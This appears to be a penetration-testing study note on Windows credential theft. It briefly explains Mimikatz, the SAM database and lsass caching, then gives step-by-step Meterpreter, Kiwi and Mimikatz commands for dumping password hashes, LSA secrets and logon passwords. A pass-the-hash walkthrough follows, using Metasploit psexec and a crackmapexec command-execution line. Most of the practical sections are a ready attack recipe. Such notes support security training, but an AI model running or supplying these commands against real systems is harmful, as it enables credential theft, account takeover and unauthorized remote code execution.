> Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It
  allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
> The SAM (Security Account Manager) database, is a database file on Windows systems
  that stores hashed user passwords.
> Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes
  are cached.
> We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a
  meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

Note: Mimikatz will require elevated privileges in order to run correctly.

Dumping Passwords with Mimikatz Practical:
> gain access with an meterpreter session
  > migrate to lsass
    > kiwi module:
    > load kiwi
      > help menu with ?
      > lsa_dump_sam        // dump sam database
      > lsa_dump_secrets    // dump passwords
      > creds_all
      > password_change     // not good in productive
    > cd C:\\
      > mkdir Temp
      > cd Temp
      > upload /usr/share/windows/resources/mimikatz/x64/mimkatz.exe
        > shell
          > .\mimikatz.exe
            > privilege::debug          // check privileges for dumping
            > lsadump::sam              // dump sam database
            > lsadump::secrets          // dump passwords
            > sekurlsa::logonpassword   // check logon passwords
              > Password (Null) means no clear text password set


Pass the Hash:
> Pass-the-hash is an exploitation technique that involves capturing or harvesting
  NTLM hashes or clear-text passwords and utilizing them to authenticate with
  the target legitimately.
> We can use multiple tools to facilitate a Pass-The-Hash attack:
  > Metasploit PsExec module
  > Crackmapexec
> This technique will allow us to obtain access to the target system via legitimate
  credentials as opposed to obtaining access via service exploitation.
  
Pass the Hash Practical:
> meterpreter shell with lsass 
> hashdump 
  > copy hash of Administrator
    > use exploit/windows/smb/psexec
      > set RHOSTS <IP>
      > set LPORT <different LPORT than in the beginning>
      > set SMBUser Administrator
      > set SMBPass <Administrator Hash>
      > set target Native\ upload
      > run
> crackmapexec smb <IP> -u Administrator -H <Hash> -x "<command>"
